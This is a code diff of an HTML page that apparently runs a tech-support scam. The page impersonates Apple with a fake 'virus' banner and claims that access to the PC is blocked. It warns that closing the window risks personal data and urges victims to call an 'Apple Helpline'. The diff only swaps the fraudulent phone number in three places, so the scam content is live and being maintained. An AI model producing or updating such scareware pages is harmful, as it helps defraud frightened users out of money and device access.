@@ -563,7 +563,7 @@
             <div class="right-foot" style="text-align: center;">
                 <span id="footertxt"><img src="microsoft.png"> Apple: </span><span
                         style="font-weight: 700;padding-left: 13px;color: #fff;">Contact Support <span
-                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-808-800-4577
+                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-808-289-9509
  (Apple Helpline)</span></span>
             </div>
         </div>
@@ -595,7 +595,8 @@
     <img id="banner" src="virus-images.jpeg">
     <div id="disclaimer">
         Access to this PC has been blocked for security reasons.<br>
-        <span class="support">Contact Apple Support: +1-808-800-4577
+        <span class="support">Contact Apple Support: +1-808-289-9509
+        
  (Apple Helpline)</span>
     </div>
     <div id="bottom">
@@ -647,7 +648,7 @@
     <p>Closing this window will put your personal information at risk and lead to a suspension of your Apple
         Registration.</p>
     <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Call Apple Support: <strong>
-            +1-808-800-4577
+            +1-808-289-9509
  (Apple Helpline) </strong></p>
     <div class="action_buttons"><a class="active" id="leave_page"
                                    style="cursor: pointer; color: #FFFFFF !important;">OK</a> <a class="active"
